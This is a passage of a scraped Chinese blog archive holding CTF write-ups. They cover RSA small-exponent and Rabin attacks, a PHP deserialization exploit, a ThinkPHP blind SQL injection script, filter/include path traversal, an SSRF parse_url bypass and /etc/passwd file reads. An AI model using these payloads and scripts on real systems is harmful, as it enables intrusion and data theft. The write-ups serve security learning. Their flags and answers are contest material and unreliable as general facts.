KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYjDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQlyioxCqbXYIMxGO4NcQIDAQAB-----END PUBLIC KEY-----Certificate: Data: Version: 1 (0x0) Serial Number: a1:8b:63:0c:7b:30:99:df Signature Algorithm: sha256WithRSAEncryption Issuer: C = JP, ST = Kawasaki, O = SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C = JP, ST = Kawasaki, O = SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71 待续…… 模不互素攻击条件存在两个或以上模数，且gcd(n1,n2)!=1 攻击原理如果两个n不互素的话，可以直接对这两个数求最大公因数，然后获得p和q，进而求得私钥 ###### 公钥指数相关攻击小公钥指数攻击攻击条件e十分小 例子假设用户使用的密钥为3，加密过程是1c ≡ m³ mod n 那么就有12m³ = c + k*nm = ³√¯(c+k*n)¯ 大黑阔可以从小到大枚举k，直到开出整数 jarvisoj Extremely hard RSA题目给了pubkey.pem和flag.enc，然后openssl读下pubkey信息有123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Public-Key: (4096 bit)Modulus: 00:b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18:fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98: de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56: 56:e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0: d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c: 97:73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05:68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef: 80:01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49: 10:1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79:c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70: eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18: 83:af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f: ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24: 13:11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6: ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0: 45:89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02:c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8: c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56: f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08:d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7: fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a: 97:94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d: ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9: 2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a: 1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b: 98:03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77: 0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3: 0b:39:29Exponent: 3 (0x3)Modulus=B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929writing RSA key-----BEGIN PUBLIC KEY-----MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY/Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIspA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AONRjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9GgCw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BFie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycGgJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdlUitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVEJvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9ACLvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcPEkP0OHRGzM6yIiqWXMMLOSkCAQM=-----END PUBLIC KEY----- e很小，所以我们可以直接进行指数攻击12345678910111213import gmpy2,libnumn=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929e=3res=0c=int(open('flag.enc','rb').read().encode('hex'),16)for k in range(118700000, 118750000): a, b = gmpy2.iroot(c+n*k,e) if b==1: res=a print k print res print libnum.n2s(res) break 他的k是118719488，减小范围，跑的快一点，最后拿到flag1Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: PCTF&#123;Sm4ll_3xpon3nt_i5_W3ak&#125; rabin算法攻击条件e = 2 攻击原理密文1c = m² mod n 解密过程12345678910算mp和mqmp = √c mod pmq = √c mod q由扩展欧几里得算出yp*p + yq*q = 1得到四个明文a = (yp*p*mq + yq*q*mp) mod nb = n - ac = (yp*p*mq - yq*q*mp) mod nd = n - c 如果 p ≡ q ≡ 3 (mod 4)，那么 jarvisoj hardRSAopenssl提信息123456789101112Public-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 2 (0x2)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgEC-----END PUBLIC KEY----- 分解n得到12p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239 利用rabin算法去写脚本1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/python# coding:utf-8import gmpy2import stringfrom Crypto.PublicKey import RSAwith open('pubkey.pem','r') as f: key = RSA.importKey(f) n = key.n e = key.ewith open('flag.enc','r') as f: c = f.read().encode('hex') c = string.atoi(c,base=16)print \"start\"p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239#计算yp和yqinv_p = gmpy2.invert(p,q)inv_q = gmpy2.invert(q,p)#计算mp和mqmp = pow(c,(p+1)/4,p)mq = pow(c,(q+1)/4,q)#算a b c da = (inv_p * p * mq + inv_q * q * mp) % nb = n - int(n)c = (inv_p * p * mq - inv_q * q * mp) % nd = n - int(c)for i in (a,b,c,d): s = '%x' % i if len(s) % 2 != 0: s = '0'+s print s.decode('hex') 最后拿到flag：PCTF{sp3ci4l_rsa}","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/12/RSA初探/","categories":[{"name":"crypto","slug":"crypto","permalink":"https://xi4or0uji.github.io/categories/crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://xi4or0uji.github.io/tags/RSA/"}]},{"title":"2018安恒杯十一月赛","date":"2019-02-10T16:00:00.000Z","path":"2019/02/11/2018安恒杯十一月赛/","text":"web手速要快这题一进去给个登录框要你输入密码，然后在头可以看到有密码","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/11/2018安恒杯十一月赛/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"},{"name":"crypto","slug":"web/crypto","permalink":"https://xi4or0uji.github.io/categories/web/crypto/"},{"name":"misc","slug":"web/crypto/misc","permalink":"https://xi4or0uji.github.io/categories/web/crypto/misc/"}],"tags":[{"name":"安恒杯","slug":"安恒杯","permalink":"https://xi4or0uji.github.io/tags/安恒杯/"}]},{"title":"2019安恒杯一月赛","date":"2019-02-06T16:00:00.000Z","path":"2019/02/07/安恒杯一月赛/","text":"webbabygo源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php@error_reporting(1);include 'flag.php';class baby&#123; protected $skyobj; public $aaa; public $bbb; function __construct() &#123; $this-&gt;skyobj = new sec; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class cool&#123; public $filename; public $nice; public $amzing; function read() &#123; $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) &#123; $file = \"./&#123;$this-&gt;filename&#125;\"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return \"you must be joking!\"; &#125; &#125; &#125;&#125;class sec&#123; function read() &#123; return \"it's so sec~~\"; &#125;&#125;if (isset($_GET['data']))&#123; $Input_data = unserialize($_GET['data']); echo $Input_data;&#125;else&#123; highlight_file(\"./index.php\");&#125;?&gt; 可以看到有个flag.php文件，也有个file_get_contents函数，想要读文件要先满足1$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb 但是这句代码前几行可以看见aaa的值会改变，且被改的值不知道，所以不能直接在类里面赋值使aaa和bbb相等，用&amp;去让他们指向相同再往上看可以看见unserialize函数，这题基本可以确定是反序列化的利用了，先构造aaa和bbb指向相同123456789101112131415161718192021222324class baby&#123; protected $skyobj; public $aaa; public $bbb; function __construct() &#123; $this-&gt;skyobj = new cool; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class cool&#123; public $filename; public $nice; public $amzing;&#125;$a = new baby();$a-&gt;bbb =&amp;$a-&gt;aaa;echo urlencode(serialize($a)); 得出1O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D 然后就是反序列化的利用，exp如下1234567891011121314151617181920212223class baby&#123; protected $skyobj; public $aaa; public $bbb; function __construct() &#123; $this-&gt;skyobj = new cool; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class cool&#123; public $filename = './flag.php'; public $nice; public $amzing = 'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D';&#125;$a = new baby();echo urlencode(serialize($a)); 得到1O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D 最后data发送过去就行 simple php这题进去就看到一个页面，扫一下后台能看到有robots.txt，打开看下有访问/admin可以看到有个登录的地方，试了一下，发现可以水平越权，最后可以1admin 1和任意密码 登进去登进去以后发现是tp3.2框架，猜测是框架注入漏洞，尝试一下1http://101.71.29.5:10010/Admin/User/Index?search[table]=flag where 1 and polygon(id)-- 可以看到数据库是tpctf，表是flag，尝试一下有没有flag这个字段1http://101.71.29.5:10010/Admin/User/Index?search[table]=flag where 1 and polygon(flag)-- 接下来看到没有unknown column，所以flag是在tpctf数据库，flag表的flag字段里面剩下的就是利用了1http://101.71.29.5:10010/Admin/User/Index?search[table]=flag where 1 and if(1,sleep(5),0)-- 然后又确实可以延时，至此，exp出来了1234567891011121314import requestsflag = ''cookies = &#123; 'PHPSESSID': 're4g49sil8hfh4ovfrk7ln1o02'&#125;for i in range(1,33): for j in '0123456789abcdef': url = 'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'+str(i)+',1))='+str(ord(j))+'),sleep(5),0)--' try: r = requests.get(url=url,timeout=3,cookies=cookies) except: flag += j print(flag) break 然后就能拿到flag了 misc赢战2019这题首先拿到一个图片，放去binwalk一下发现还有另一张图片，分离出来扫一下只有眉头一皱，发现这个二维码并没有那么简单，接下来去stegsolve，点几下就有了……. memory这题是内存取证，直接用volatility做就行12volatility imageinfo -f memory #分析操作系统volatility hushdump -f memory --profile=WinXPSP2x86 #查看当前操作系统用户的password hush 这样就能知道管理员的密码了1Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b::: 将密码拿去解密一下然后再加密就是flag了 crypto键盘之争这题给了这个字符串：ypau_kjg;”g;”ypau+，然后题目是键盘之争，谷歌做题23333谷歌第一个就有了，发现是两个键盘的对应对应出来是flag{this_is_flag}，然后md5就行了 get it题目123456789101112131415161718Alice和Bob正在进行通信，作为中间人的Eve一直在窃听他们两人的通信。Eve窃听到这样一段内容，主要内容如下：p = 37A = 17B = 31U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0OK4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb627oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZwHkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpKix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXlVwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6m5lSYiFFd0E=分析得知，他们是在公共信道上交换加密密钥，共同建立共享密钥。而上面这段密文是Alice和Bob使用自己的密值和共享秘钥，组成一串字符的md5值的前16位字符作为密码使用另外一种加密算法加密明文得到的。例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：password = hashlib.md5(\"(3,6,35)\").hexdigest()[0:16] 这题的过程跟Diffie-Hellman密钥交换算法很相似所以A的公钥为17，B的公钥为31，素数p为37，现在要求gg是模p本原单位根，所谓本原单位根就是指在模p乘法运算下，g的1次方，2次方……(p-1)次方这p-1个数互不相同，并且取遍1到p-1。调用sagemath函数求出来12$ print primitive_root(37)$ 2 又因为12A = g^a mod pB = g^b mod p 剩下求a和b可以用在线网站求可以得出来a是7，b是9，又key = g^(b*a) mod p12345a = 7b = 9g = 2p = 37print pow(g,a*b,p) 求出来key是6结合样例的去求password123import hashlibpassword = hashlib.md5(\"(7,9,6)\").hexdigest()[0:16]print password 得出来a7ece9d133c9ec03再结合密文解密，因为是U2F开头，尝试下RC4，AES，DES等解密DES解密出来flag是8598544ba1a5713b1de04d3f0c41eb71参考一叶飘零的wp","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/07/安恒杯一月赛/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"},{"name":"crypto","slug":"web/crypto","permalink":"https://xi4or0uji.github.io/categories/web/crypto/"},{"name":"misc","slug":"web/crypto/misc","permalink":"https://xi4or0uji.github.io/categories/web/crypto/misc/"}],"tags":[{"name":"安恒杯","slug":"安恒杯","permalink":"https://xi4or0uji.github.io/tags/安恒杯/"}]},{"title":"2019 hgame week2","date":"2019-02-02T16:00:00.000Z","path":"2019/02/03/2019-hgame-week2/","text":"easy_php这题进去首先可以看到一个index.html，题目是where is my robots，访问一下robots.txt，提示img/index.php，访问一下这个php文件，就到了代码审计了12345678&lt;?php error_reporting(0); $img = $_GET['img']; if(!isset($img)) $img = '1'; $img = str_replace('../', '', $img); include_once($img.\".php\"); highlight_file(__FILE__); 可以看到一个include_once，很明显的文件包含漏洞，同时扫下后台可以知道easyphp目录下有个flag.php，但是也可以看到flag.php是在img/index.php的上一层目录，又因为过滤了一次../双写绕过就行，最终payload1http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=....//flag php trick源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET['str1'];$str2 = (string)@$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = @$_GET['H_game'];$url = @$_GET['url'];if( $str1 == $str2 )&#123; die('step 1 fail');&#125;if( md5($str1) != md5($str2) )&#123; die('step 2 fail');&#125;if( $str3 == $str4 )&#123; die('step 3 fail');&#125;if ( md5($str3) !== md5($str4))&#123; die('step 4 fail');&#125;if (strpos($_SERVER['QUERY_STRING'], \"H_game\") !==false) &#123; die('step 5 fail');&#125;if(is_numeric($str5))&#123; die('step 6 fail');&#125;if ($str5&lt;9999999999)&#123; die('step 7 fail');&#125;if ((string)$str5&gt;0)&#123; die('step 8 fial');&#125;if (parse_url($url, PHP_URL_HOST) !== \"www.baidu.com\")&#123; die('step 9 fail');&#125;if (parse_url($url,PHP_URL_SCHEME) !== \"http\")&#123; die('step 10 fail');&#125;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);$output = curl_exec($ch);curl_close($ch);if($output === FALSE)&#123; die('step 11 fail');&#125;else&#123; echo $output;&#125; 可以看到，前四个step都可以用php黑魔法和数组绕过1str1=QNKCDZO&amp;str2=240610708&amp;str3[]=1&amp;str4[]=2 第五步可以看到要一个H_game，这个可以用点绕过下划线到了str5要求不是数字，大于9999999999同时(string)str5小于0，这个用数组绕过最后的parse_url利用它解析顺序的不同payload1str1=QNKCDZO&amp;str2=240610708&amp;str3[]=1&amp;str4[]=2&amp;H.game[]=1&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php 然后拿到flag.php文件1234567891011121314&lt;?php//flag.phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') &#123; die('only localhost can see it');&#125;$filename = $_GET['filename']??'';if (file_exists($filename)) &#123; echo \"sorry,you can't see it\";&#125;else&#123; echo file_get_contents($filename);&#125;highlight_file(__FILE__); 然后就是利用伪协议读文件了1str1=QNKCDZO&amp;str2=240610708&amp;str3[]=1&amp;str4[]=2&amp;H.game[]=1&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php PHP is the best language源码1234567891011121314151617181920212223242526&lt;?php include 'secret.php'; #echo $flag; #echo $secret; if (empty($_POST['gate']) || empty($_POST['key'])) &#123; highlight_file(__FILE__); exit; &#125; if (isset($_POST['door']))&#123; $secret = hash_hmac('sha256', $_POST['door'], $secret); &#125; $gate = hash_hmac('sha256', $_POST['key'], $secret); if ($gate !== $_POST['gate']) &#123; echo \"Hacker GetOut!!\"; exit; &#125; if ((md5($_POST['key'])+1) == (md5(md5($_POST['key'])))+1) &#123; echo \"Wow!!!\"; echo \"&lt;/br&gt;\"; echo $flag; &#125; else &#123; echo \"Hacker GetOut!!\"; &#125; 首先，sha256不能处理数组，所以我们可以先试下如果让他处理数组会怎样12345&lt;?php$secret = \"123456\";$data = array('1'=&gt;'1');$gate = hash_hmac('sha256',$data,$secret);var_dump($gate); 所以现在gate的值我们可以控制了，只剩下一个key值要满足md5($_POST[&#39;key&#39;])+1 == md5(md5($_POST[&#39;key&#39;]))+1，这个我们通过爆破可以找到一个12是可以满足这条式子的，所以最终payload1door[]=1&amp;gate=4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf&amp;key=12 Baby_Spider这题要你在很短的时间里算出一些很长的式子，上脚本上脚本这道题有很短坑，要求加user-agent，到了中间字符又会被替换（0123456789 -&gt; 1026943587），最后还有去到css看真实的值12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# -*- coding: UTF-8 -*-import requestsimport reheader=&#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36\"&#125;token=&#123; 'token':'cUUHjtSX6xcnuG1HZQoaBi7rUq0WzoIJ'&#125;list='1026943587'url='http://111.231.140.29:10000/'url1='http://111.231.140.29:10000/question'url2='http://111.231.140.29:10000/solution'url3='http://111.231.140.29:10000/statics/style.css'res = '&lt;span&gt;(.*?)='r=requests.post(url=url,data=token)session=r.cookiesprint(\"[*] \"+\"-\"*40)for i in range(0,10): math = re.findall(res, r.content.decode('utf-8')) math = str(math)[2:len(math) - 3] print('[+] %s '% math) answer = eval(math) result = &#123; 'answer': answer &#125; print ('[+] %d '% answer) r=requests.post(url=url2,data=result,cookies=session,headers=header) session = r.cookies print(\"[*] \" + \"-\" * 40)tmp=''for i in range(10,20): math = re.findall(res, r.content.decode('utf-8')) math = str(math)[2:len(math) - 3] for j in math: if ord(j) &gt; 47: tmp += list[int(j)] else: tmp += j math = tmp tmp = '' print('[+] %s ' % math) answer = (eval(math)) result = &#123; 'answer': answer &#125; print ('[+] %d ' % answer) r = requests.post(url=url2, data=result, cookies=session, headers=header) session = r.cookies print(\"[*] \" + \"-\" * 40)res = 'content:\"(.*?)='for i in range(20,30): css = requests.get(url=url3, cookies=session, headers=header) math = re.findall(res, css.content.decode('utf-8')) math = str(math)[2:len(math) - 3] print('[+] %s ' % math) answer = (eval(math)) result = &#123; 'answer': answer &#125; print ('[+] %d ' % answer) r = requests.post(url=url2, data=result, cookies=session, headers=header) session=r.cookies print(\"[*] \" + \"-\" * 40) if \"hgame\" in r.content.decode('utf-8'): print(r.content.decode('utf-8')) Math有趣这里进去源码能看到一个图片的地址1&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt; 接着乱输发现会报错，顺便还把路径给爆出来了试着读一下文件1../../../../../../../../../../../../../etc/passwd base64加密一下过去居然能读到文件，现在我们就要去class读文件了123/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.classpayload:http://test.tan90.me:8080/img/L3Vzci9sb2NhbC90b21jYXQvd2ViYXBwcy9ST09UL1dFQi1JTkYvY2xhc3Nlcy9oZ2FtZS9jb250cm9sbGVyL01hdGhDb250cm9sbGVyLmNsYXNz 下下来一个class文件然后反编译一下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101package hgame.controller;import java.io.FileInputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.io.PrintStream;import java.util.Base64;import java.util.Base64.Decoder;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.springframework.stereotype.Controller;import org.springframework.ui.ModelMap;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;@Controllerpublic class MathController&#123; @RequestMapping(value=&#123;\"/index\"&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;) public String index(ModelMap model, HttpSession session, HttpServletResponse response) throws IOException &#123; Object step = session.getAttribute(\"step\"); if (step == null) &#123; session.setAttribute(\"step\", Character.valueOf('1')); response.sendRedirect(\"/index.php\"); return null; &#125; if (step.toString().equals(\"1\")) &#123; model.addAttribute(\"message\", \"Welcome to the 